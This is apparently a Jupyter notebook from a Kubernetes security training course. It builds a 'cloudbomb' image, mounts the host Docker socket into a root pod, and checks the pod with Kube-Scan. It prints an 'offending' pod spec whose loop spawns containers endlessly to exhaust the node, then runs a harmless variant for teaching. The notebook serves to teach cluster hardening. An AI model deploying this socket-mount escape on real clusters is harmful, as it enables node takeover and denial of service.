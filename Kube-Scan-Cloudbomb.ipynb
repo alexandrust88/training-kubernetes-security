{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "**This notebook covered by the following [license](License.ipynb)  This note must not be removed**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cloudbomb\n",
    "\n",
    "\n",
    "## Purpose\n",
    "\n",
    "It is shown, how dangerous it is \n",
    "\n",
    "* to start an image from an untrusted source\n",
    "* with __root privileges__\n",
    "* and __access to the host file system__\n",
    "\n",
    "This examples destroys the cluster step by step. \n",
    "\n",
    "It is a dangerous example, turned _s l o w_ for didactic purposes.\n",
    "\n",
    "It can even be made more disruptive easily.\n",
    "\n",
    "Don't put images like this into public registries.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Create an empty directory and change into"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "mkdir: cannot create directory 'cloudbomb': File exists\n"
     ]
    }
   ],
   "source": [
    "mkdir -p cloudbomb\n",
    "cd cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/minikube-host/training/notebooks/cloudbomb\n"
     ]
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Get Docker\n",
    "\n",
    "See the latest statically linked versions here\n",
    "https://download.docker.com/linux/static/stable/x86_64/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n",
      "                                 Dload  Upload   Total   Spent    Left  Speed\n",
      "100 60.7M  100 60.7M    0     0  21.8M      0  0:00:02  0:00:02 --:--:-- 21.8M\n"
     ]
    }
   ],
   "source": [
    "curl https://download.docker.com/linux/static/stable/x86_64/docker-19.03.8.tgz -o docker.tgz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "docker/\n",
      "docker/containerd\n",
      "docker/docker\n",
      "docker/ctr\n",
      "docker/dockerd\n",
      "docker/runc\n",
      "docker/docker-proxy\n",
      "docker/docker-init\n",
      "docker/containerd-shim\n"
     ]
    }
   ],
   "source": [
    "tar tzf docker.tgz"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "/minikube-host/training/notebooks/cloudbomb\n"
     ]
    }
   ],
   "source": [
    "pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [],
   "source": [
    "tar xzf docker.tgz"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Create the Dockerfile\n",
    "\n",
    "and build the image **inside minikube**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "FROM alpine\n",
      "\n",
      "COPY docker/docker /usr/bin\n",
      "\n",
      "CMD [\"docker\", \"ps\"]\n"
     ]
    }
   ],
   "source": [
    "cat > Dockerfile <<EOF\n",
    "FROM alpine\n",
    "\n",
    "COPY docker/docker /usr/bin\n",
    "\n",
    "CMD [\"docker\", \"ps\"]\n",
    "EOF\n",
    "cat Dockerfile"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "REPOSITORY                                TAG        IMAGE ID       CREATED         SIZE\n",
      "nginx                                     latest     f6d0b4767a6c   2 weeks ago     133MB\n",
      "nginxinc/nginx-unprivileged               latest     b34dace3569f   5 weeks ago     133MB\n",
      "kubernetesui/dashboard                    v2.1.0     9a07b5b4bfac   6 weeks ago     226MB\n",
      "k8s.gcr.io/kube-proxy                     v1.20.0    10cc881966cf   6 weeks ago     118MB\n",
      "k8s.gcr.io/kube-scheduler                 v1.20.0    3138b6e3d471   6 weeks ago     46.4MB\n",
      "k8s.gcr.io/kube-controller-manager        v1.20.0    b9fa1895dcaa   6 weeks ago     116MB\n",
      "k8s.gcr.io/kube-apiserver                 v1.20.0    ca9843d3b545   6 weeks ago     122MB\n",
      "gcr.io/k8s-minikube/storage-provisioner   v4         85069258b98a   7 weeks ago     29.7MB\n",
      "k8s.gcr.io/etcd                           3.4.13-0   0369cf4303ff   5 months ago    253MB\n",
      "k8s.gcr.io/coredns                        1.7.0      bfe3a36ebd25   7 months ago    45.2MB\n",
      "kubernetesui/metrics-scraper              v1.0.4     86262685d9ab   10 months ago   36.9MB\n",
      "k8s.gcr.io/pause                          3.2        80d28bedfe5d   11 months ago   683kB\n"
     ]
    }
   ],
   "source": [
    "docker images"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending build context to Docker daemon  274.7MB\n",
      "Step 1/3 : FROM alpine\n",
      "latest: Pulling from library/alpine\n",
      "\n",
      "\u001b[1BDigest: sha256:d9a7354e3845ea8466bb00b22224d9116b183e594527fb5b6c3d30bc01a20378\n",
      "Status: Downloaded newer image for alpine:latest\n",
      " ---> 7731472c3f2a\n",
      "Step 2/3 : COPY docker/docker /usr/bin\n",
      " ---> 57a3970282d7\n",
      "Step 3/3 : CMD [\"docker\", \"ps\"]\n",
      " ---> Running in 538fc970d206\n",
      "Removing intermediate container 538fc970d206\n",
      " ---> 55cfdcadd3ec\n",
      "Successfully built 55cfdcadd3ec\n",
      "Successfully tagged cloudbomb:latest\n"
     ]
    }
   ],
   "source": [
    "docker build . -t cloudbomb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "#### Check the images\n",
    "\n",
    "`grep -E ... ` is only for colouring "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "REPOSITORY                                TAG        IMAGE ID       CREATED          SIZE\n",
      "\u001b[01;31m\u001b[Kcloudbomb                                 latest     55cfdcadd3ec   22 seconds ago   71.4MB\u001b[m\u001b[K\n",
      "alpine                                    latest     7731472c3f2a   11 days ago      5.61MB\n",
      "nginx                                     latest     f6d0b4767a6c   2 weeks ago      133MB\n",
      "nginxinc/nginx-unprivileged               latest     b34dace3569f   5 weeks ago      133MB\n",
      "kubernetesui/dashboard                    v2.1.0     9a07b5b4bfac   6 weeks ago      226MB\n",
      "k8s.gcr.io/kube-proxy                     v1.20.0    10cc881966cf   6 weeks ago      118MB\n",
      "k8s.gcr.io/kube-apiserver                 v1.20.0    ca9843d3b545   6 weeks ago      122MB\n",
      "k8s.gcr.io/kube-controller-manager        v1.20.0    b9fa1895dcaa   6 weeks ago      116MB\n",
      "k8s.gcr.io/kube-scheduler                 v1.20.0    3138b6e3d471   6 weeks ago      46.4MB\n",
      "gcr.io/k8s-minikube/storage-provisioner   v4         85069258b98a   7 weeks ago      29.7MB\n",
      "k8s.gcr.io/etcd                           3.4.13-0   0369cf4303ff   5 months ago     253MB\n",
      "k8s.gcr.io/coredns                        1.7.0      bfe3a36ebd25   7 months ago     45.2MB\n",
      "kubernetesui/metrics-scraper              v1.0.4     86262685d9ab   10 months ago    36.9MB\n",
      "k8s.gcr.io/pause                          3.2        80d28bedfe5d   11 months ago    683kB\n"
     ]
    }
   ],
   "source": [
    "docker images | grep --color=always -E '$|cloudbomb.*$' "
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Create the Cloudbomb Pod\n",
    "\n",
    "* it is mounting the Docker socket `/var/run/docker.sock` into the container, we have `hostPath` rights\n",
    "* the `docker` process is running as `root`\n",
    "* **Gotcha**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Offending version, don't use\n",
    "\n",
    "```yaml\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    "  name: cloudbomb \n",
    "spec:\n",
    "  containers:\n",
    "  - image: cloudbomb\n",
    "    imagePullPolicy: IfNotPresent\n",
    "    command:\n",
    "      - /bin/sh\n",
    "      - \"-c\" \n",
    "      - \"while true; \\\n",
    "           do \\   \n",
    "             docker run -d --name BOOM_\\$(cat /dev/urandom | \\\n",
    "             tr -cd 'a-f0-9' | \\\n",
    "             head -c 6) nginx ; \\\n",
    "             sleep 10 ; \\\n",
    "           done\"\n",
    "    name: cloudbomb\n",
    "    volumeMounts:\n",
    "    - mountPath: /var/run/docker.sock\n",
    "      name: docker-socket\n",
    "  volumes:\n",
    "  - name: docker-socket\n",
    "    hostPath:\n",
    "      path: /var/run/docker.sock\n",
    "      type: Socket\n",
    "```\n",
    "\n",
    "# Soft version"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod/cloudbomb created\n"
     ]
    }
   ],
   "source": [
    "kubectl create -f - <<EOF\n",
    "apiVersion: v1\n",
    "kind: Pod\n",
    "metadata:\n",
    "  name: cloudbomb \n",
    "spec:\n",
    "  containers:\n",
    "  - image: cloudbomb\n",
    "    imagePullPolicy: IfNotPresent\n",
    "    command:\n",
    "      - /bin/sh\n",
    "      - \"-c\" \n",
    "      - \"while true; \\\n",
    "           do \\   \n",
    "             docker ps ; \\\n",
    "             sleep 10 ; \\\n",
    "           done\"\n",
    "    name: cloudbomb\n",
    "    volumeMounts:\n",
    "    - mountPath: /var/run/docker.sock\n",
    "      name: docker-socket\n",
    "  volumes:\n",
    "  - name: docker-socket\n",
    "    hostPath:\n",
    "      path: /var/run/docker.sock\n",
    "      type: Socket\n",
    "EOF"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS              RESTARTS   AGE\n",
      "cloudbomb                       0/1     ContainerCreating   0          1s\n",
      "nginx-strict-5cdc48cf55-f5r5l   1/1     Running             0          3h45m\n",
      "nginx-strict-5cdc48cf55-v72v5   1/1     Running             0          3h45m\n",
      "nginx-strict-5cdc48cf55-xkh98   1/1     Running             0          3h45m\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pod/cloudbomb condition met\n"
     ]
    }
   ],
   "source": [
    "kubectl wait --for=condition=ready --timeout=10s pod/cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "NAME                            READY   STATUS    RESTARTS   AGE\n",
      "cloudbomb                       1/1     Running   0          6s\n",
      "nginx-strict-5cdc48cf55-f5r5l   1/1     Running   0          3h45m\n",
      "nginx-strict-5cdc48cf55-v72v5   1/1     Running   0          3h45m\n",
      "nginx-strict-5cdc48cf55-xkh98   1/1     Running   0          3h45m\n"
     ]
    }
   ],
   "source": [
    "kubectl get pods"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED                  STATUS                  PORTS               NAMES\n",
      "05023ceb4f59        55cfdcadd3ec                  \"/bin/sh -c 'while t…\"   Less than a second ago   Up Less than a second                       k8s_cloudbomb_cloudbomb_default_7d9ed0e8-219a-4afe-a24c-ee934f434023_0\n",
      "bd453f2dac29        k8s.gcr.io/pause:3.2          \"/pause\"                 1 second ago             Up Less than a second                       k8s_POD_cloudbomb_default_7d9ed0e8-219a-4afe-a24c-ee934f434023_0\n",
      "dc3f93033f03        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   4 hours ago              Up 4 hours                                  k8s_nginx_nginx-strict-5cdc48cf55-v72v5_default_40e29b43-4a1e-430a-9e5c-c6acf05a54cf_0\n",
      "9fda29057549        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   4 hours ago              Up 4 hours                                  k8s_nginx_nginx-strict-5cdc48cf55-f5r5l_default_010fda87-d567-4ed6-88ed-0ce86cda498d_0\n",
      "00d6d05a06d1        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   4 hours ago              Up 4 hours                                  k8s_nginx_nginx-strict-5cdc48cf55-xkh98_default_eb2f6625-f806-4cf6-abba-e8accd7d34fb_0\n",
      "17df34baef2c        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago              Up 4 hours                                  k8s_POD_nginx-strict-5cdc48cf55-xkh98_default_eb2f6625-f806-4cf6-abba-e8accd7d34fb_0\n",
      "377de457bfea        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago              Up 4 hours                                  k8s_POD_nginx-strict-5cdc48cf55-v72v5_default_40e29b43-4a1e-430a-9e5c-c6acf05a54cf_0\n",
      "3ec2a56c47ff        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago              Up 4 hours                                  k8s_POD_nginx-strict-5cdc48cf55-f5r5l_default_010fda87-d567-4ed6-88ed-0ce86cda498d_0\n",
      "f7130539172d        9a07b5b4bfac                  \"/dashboard --insecu…\"   4 hours ago              Up 4 hours                                  k8s_kubernetes-dashboard_kubernetes-dashboard-6cff4c7c4f-68nvz_kubernetes-dashboard_61fa8d2d-585f-4db2-a77f-3ed6c19c0b68_0\n",
      "5e89e26739de        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago              Up 4 hours                                  k8s_POD_kubernetes-dashboard-6cff4c7c4f-68nvz_kubernetes-dashboard_61fa8d2d-585f-4db2-a77f-3ed6c19c0b68_0\n",
      "856c490e6654        86262685d9ab                  \"/metrics-sidecar\"       4 hours ago              Up 4 hours                                  k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-c95fcf479-zchqb_kubernetes-dashboard_8e0a86a2-9ddb-49a2-853a-bebcba4c9340_0\n",
      "63cc8aef4d22        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago              Up 4 hours                                  k8s_POD_dashboard-metrics-scraper-c95fcf479-zchqb_kubernetes-dashboard_8e0a86a2-9ddb-49a2-853a-bebcba4c9340_0\n",
      "267e2081d55b        85069258b98a                  \"/storage-provisioner\"   7 hours ago              Up 7 hours                                  k8s_storage-provisioner_storage-provisioner_kube-system_a9845ae3-6bbe-40cf-99e3-fcfb2974afc9_0\n",
      "1acba0cf04de        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_storage-provisioner_kube-system_a9845ae3-6bbe-40cf-99e3-fcfb2974afc9_0\n",
      "c42428440d94        bfe3a36ebd25                  \"/coredns -conf /etc…\"   7 hours ago              Up 7 hours                                  k8s_coredns_coredns-74ff55c5b-bx9lj_kube-system_deceaf1d-9bcb-48f8-aadf-7c39bb2853d3_0\n",
      "37a3f07e57b5        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_coredns-74ff55c5b-bx9lj_kube-system_deceaf1d-9bcb-48f8-aadf-7c39bb2853d3_0\n",
      "9a12ffc02d1a        10cc881966cf                  \"/usr/local/bin/kube…\"   7 hours ago              Up 7 hours                                  k8s_kube-proxy_kube-proxy-2rf67_kube-system_cb7b4a70-485b-47c1-a5a6-f672918a75eb_0\n",
      "9954e708415e        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_kube-proxy-2rf67_kube-system_cb7b4a70-485b-47c1-a5a6-f672918a75eb_0\n",
      "d92539702967        3138b6e3d471                  \"kube-scheduler --au…\"   7 hours ago              Up 7 hours                                  k8s_kube-scheduler_kube-scheduler-minikube_kube-system_3478da2c440ba32fb6c087b3f3b99813_0\n",
      "b476a23a2e9a        0369cf4303ff                  \"etcd --advertise-cl…\"   7 hours ago              Up 7 hours                                  k8s_etcd_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_0\n",
      "798b58762190        b9fa1895dcaa                  \"kube-controller-man…\"   7 hours ago              Up 7 hours                                  k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_a3e7be694ef7cf952503c5d331abc0ac_0\n",
      "be7780ef7667        ca9843d3b545                  \"kube-apiserver --ad…\"   7 hours ago              Up 7 hours                                  k8s_kube-apiserver_kube-apiserver-minikube_kube-system_524cecac593a7ad14f29307cb61f56b8_0\n",
      "ccb44c2dac56        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_0\n",
      "4626a9936cb7        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_kube-scheduler-minikube_kube-system_3478da2c440ba32fb6c087b3f3b99813_0\n",
      "f208de4c0615        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_kube-controller-manager-minikube_kube-system_a3e7be694ef7cf952503c5d331abc0ac_0\n",
      "3777c3565877        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago              Up 7 hours                                  k8s_POD_kube-apiserver-minikube_kube-system_524cecac593a7ad14f29307cb61f56b8_0\n",
      "CONTAINER ID        IMAGE                         COMMAND                  CREATED             STATUS              PORTS               NAMES\n",
      "05023ceb4f59        55cfdcadd3ec                  \"/bin/sh -c 'while t…\"   10 seconds ago      Up 10 seconds                           k8s_cloudbomb_cloudbomb_default_7d9ed0e8-219a-4afe-a24c-ee934f434023_0\n",
      "bd453f2dac29        k8s.gcr.io/pause:3.2          \"/pause\"                 11 seconds ago      Up 10 seconds                           k8s_POD_cloudbomb_default_7d9ed0e8-219a-4afe-a24c-ee934f434023_0\n",
      "dc3f93033f03        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   4 hours ago         Up 4 hours                              k8s_nginx_nginx-strict-5cdc48cf55-v72v5_default_40e29b43-4a1e-430a-9e5c-c6acf05a54cf_0\n",
      "9fda29057549        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   4 hours ago         Up 4 hours                              k8s_nginx_nginx-strict-5cdc48cf55-f5r5l_default_010fda87-d567-4ed6-88ed-0ce86cda498d_0\n",
      "00d6d05a06d1        nginxinc/nginx-unprivileged   \"/docker-entrypoint.…\"   4 hours ago         Up 4 hours                              k8s_nginx_nginx-strict-5cdc48cf55-xkh98_default_eb2f6625-f806-4cf6-abba-e8accd7d34fb_0\n",
      "17df34baef2c        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago         Up 4 hours                              k8s_POD_nginx-strict-5cdc48cf55-xkh98_default_eb2f6625-f806-4cf6-abba-e8accd7d34fb_0\n",
      "377de457bfea        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago         Up 4 hours                              k8s_POD_nginx-strict-5cdc48cf55-v72v5_default_40e29b43-4a1e-430a-9e5c-c6acf05a54cf_0\n",
      "3ec2a56c47ff        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago         Up 4 hours                              k8s_POD_nginx-strict-5cdc48cf55-f5r5l_default_010fda87-d567-4ed6-88ed-0ce86cda498d_0\n",
      "f7130539172d        9a07b5b4bfac                  \"/dashboard --insecu…\"   4 hours ago         Up 4 hours                              k8s_kubernetes-dashboard_kubernetes-dashboard-6cff4c7c4f-68nvz_kubernetes-dashboard_61fa8d2d-585f-4db2-a77f-3ed6c19c0b68_0\n",
      "5e89e26739de        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago         Up 4 hours                              k8s_POD_kubernetes-dashboard-6cff4c7c4f-68nvz_kubernetes-dashboard_61fa8d2d-585f-4db2-a77f-3ed6c19c0b68_0\n",
      "856c490e6654        86262685d9ab                  \"/metrics-sidecar\"       4 hours ago         Up 4 hours                              k8s_dashboard-metrics-scraper_dashboard-metrics-scraper-c95fcf479-zchqb_kubernetes-dashboard_8e0a86a2-9ddb-49a2-853a-bebcba4c9340_0\n",
      "63cc8aef4d22        k8s.gcr.io/pause:3.2          \"/pause\"                 4 hours ago         Up 4 hours                              k8s_POD_dashboard-metrics-scraper-c95fcf479-zchqb_kubernetes-dashboard_8e0a86a2-9ddb-49a2-853a-bebcba4c9340_0\n",
      "267e2081d55b        85069258b98a                  \"/storage-provisioner\"   7 hours ago         Up 7 hours                              k8s_storage-provisioner_storage-provisioner_kube-system_a9845ae3-6bbe-40cf-99e3-fcfb2974afc9_0\n",
      "1acba0cf04de        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_storage-provisioner_kube-system_a9845ae3-6bbe-40cf-99e3-fcfb2974afc9_0\n",
      "c42428440d94        bfe3a36ebd25                  \"/coredns -conf /etc…\"   7 hours ago         Up 7 hours                              k8s_coredns_coredns-74ff55c5b-bx9lj_kube-system_deceaf1d-9bcb-48f8-aadf-7c39bb2853d3_0\n",
      "37a3f07e57b5        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_coredns-74ff55c5b-bx9lj_kube-system_deceaf1d-9bcb-48f8-aadf-7c39bb2853d3_0\n",
      "9a12ffc02d1a        10cc881966cf                  \"/usr/local/bin/kube…\"   7 hours ago         Up 7 hours                              k8s_kube-proxy_kube-proxy-2rf67_kube-system_cb7b4a70-485b-47c1-a5a6-f672918a75eb_0\n",
      "9954e708415e        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_kube-proxy-2rf67_kube-system_cb7b4a70-485b-47c1-a5a6-f672918a75eb_0\n",
      "d92539702967        3138b6e3d471                  \"kube-scheduler --au…\"   7 hours ago         Up 7 hours                              k8s_kube-scheduler_kube-scheduler-minikube_kube-system_3478da2c440ba32fb6c087b3f3b99813_0\n",
      "b476a23a2e9a        0369cf4303ff                  \"etcd --advertise-cl…\"   7 hours ago         Up 7 hours                              k8s_etcd_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_0\n",
      "798b58762190        b9fa1895dcaa                  \"kube-controller-man…\"   7 hours ago         Up 7 hours                              k8s_kube-controller-manager_kube-controller-manager-minikube_kube-system_a3e7be694ef7cf952503c5d331abc0ac_0\n",
      "be7780ef7667        ca9843d3b545                  \"kube-apiserver --ad…\"   7 hours ago         Up 7 hours                              k8s_kube-apiserver_kube-apiserver-minikube_kube-system_524cecac593a7ad14f29307cb61f56b8_0\n",
      "ccb44c2dac56        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_etcd-minikube_kube-system_c31fe6a5afdd142cf3450ac972274b36_0\n",
      "4626a9936cb7        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_kube-scheduler-minikube_kube-system_3478da2c440ba32fb6c087b3f3b99813_0\n",
      "f208de4c0615        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_kube-controller-manager-minikube_kube-system_a3e7be694ef7cf952503c5d331abc0ac_0\n",
      "3777c3565877        k8s.gcr.io/pause:3.2          \"/pause\"                 7 hours ago         Up 7 hours                              k8s_POD_kube-apiserver-minikube_kube-system_524cecac593a7ad14f29307cb61f56b8_0\n"
     ]
    }
   ],
   "source": [
    "kubectl logs cloudbomb"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Docker is 💩, let us use `cri-o`\n",
    "\n",
    "Doesn' solve the principle problem"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Docker vs Kubernetes\n",
    "\n",
    "The docker command bypasses Kubernetes. It is *not* visible to the `kubelet` and the `api-server`\n",
    "\n",
    "It will kill the node _s l o w l y_"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "docker ps | grep -E '$|.*BOOM.*$'"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Kube-Scan\n",
    "\n",
    "Examine the pod with [Octarine Kube-Scan](https://github.com/octarinesec/kube-scan)\n",
    "\n",
    "Open a separate terminal window and run `minikube tunnel` in this terminal"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace/kube-scan created\n",
      "configmap/kube-scan created\n",
      "serviceaccount/kube-scan created\n",
      "clusterrole.rbac.authorization.k8s.io/kube-scan created\n",
      "clusterrolebinding.rbac.authorization.k8s.io/kube-scan created\n",
      "deployment.apps/kube-scan created\n",
      "service/kube-scan-ui created\n"
     ]
    }
   ],
   "source": [
    "kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "deployment.apps/kube-scan condition met\n"
     ]
    }
   ],
   "source": [
    "kubectl wait -n kube-scan --for=condition=available deployment/kube-scan"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "namespace/kube-scan unchanged\n",
      "configmap/kube-scan unchanged\n",
      "serviceaccount/kube-scan unchanged\n",
      "\u001b[33;1mWarning:\u001b[0m rbac.authorization.k8s.io/v1beta1 ClusterRole is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRole\n",
      "clusterrole.rbac.authorization.k8s.io/kube-scan configured\n",
      "\u001b[33;1mWarning:\u001b[0m rbac.authorization.k8s.io/v1beta1 ClusterRoleBinding is deprecated in v1.17+, unavailable in v1.22+; use rbac.authorization.k8s.io/v1 ClusterRoleBinding\n",
      "clusterrolebinding.rbac.authorization.k8s.io/kube-scan configured\n",
      "deployment.apps/kube-scan unchanged\n",
      "service/kube-scan-ui configured\n"
     ]
    }
   ],
   "source": [
    "kubectl apply -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "http://10.96.191.79\n"
     ]
    }
   ],
   "source": [
    "echo http://$(kubectl -n kube-scan get service kube-scan-ui -o jsonpath={..ip})"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Risk Score\n",
    "\n",
    "Current 5, should be 8-9 \n",
    "\n",
    "I own the node, no network access"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Cleanup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl delete pod cloudbomb"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "kubectl delete -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan.yaml -f https://raw.githubusercontent.com/octarinesec/kube-scan/master/kube-scan-lb.yaml"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Bash",
   "language": "bash",
   "name": "bash"
  },
  "language_info": {
   "codemirror_mode": "shell",
   "file_extension": ".sh",
   "mimetype": "text/x-sh",
   "name": "bash"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
